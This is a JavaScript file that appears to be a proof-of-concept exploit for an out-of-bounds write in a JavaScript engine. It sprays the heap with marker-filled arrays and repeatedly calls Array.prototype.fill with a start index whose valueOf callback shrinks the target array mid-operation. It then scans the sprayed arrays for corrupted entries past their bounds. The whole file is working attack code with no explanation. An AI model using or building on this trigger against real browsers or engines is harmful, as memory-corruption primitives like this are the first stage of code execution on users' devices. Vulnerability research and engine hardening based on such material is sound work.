import { log, sleep } from './module/utils.mjs';

class SimpleOOBSpray {
    constructor() {
        this.spray = [];
        this.marker = 0x42424242;
    }

    async execute() {
        await this.sprayArrays();
        await this.multipleOOB();
        await this.checkCorruption();
    }

    async sprayArrays() {
        for (let i = 0; i < 1000; i++) {
            const arr = new Array(100);
            for (let j = 0; j < arr.length; j++) {
                arr[j] = {
                    marker: this.marker,
                    index: i,
                    position: j
                };
            }
            this.spray.push(arr);
        }
        log("Sprayed " + this.spray.length + " arrays");
    }

    async multipleOOB() {
        for (let round = 0; round < 200; round++) {
            await this.triggerOOB(round);
            await sleep(5);
        }
    }

    async triggerOOB(round) {
        const v0 = [];
        for (let i = 0; i < 1000000; i++) {
            v0[i] = [];
        }
        
        let shrunk = false;
        const o14 = {
            valueOf: () => {
                if (!shrunk) {
                    v0.length = 100;
                    shrunk = true;
                }
                return 0;
            }
        };
        
        v0.fill({oob: true, round: round}, o14);
        log("OOB round " + round + " completed");
    }

    async checkCorruption() {
        let found = 0;
        for (let i = 0; i < this.spray.length; i++) {
            const arr = this.spray[i];
            for (let j = arr.length; j < arr.length + 10; j++) {
                if (arr[j] !== undefined && arr[j].marker === this.marker) {
                    log("FOUND OOB: array " + i + " index " + j);
                    found++;
                }
            }
        }
        log("Total OOB found: " + found);
    }
}

new SimpleOOBSpray().execute();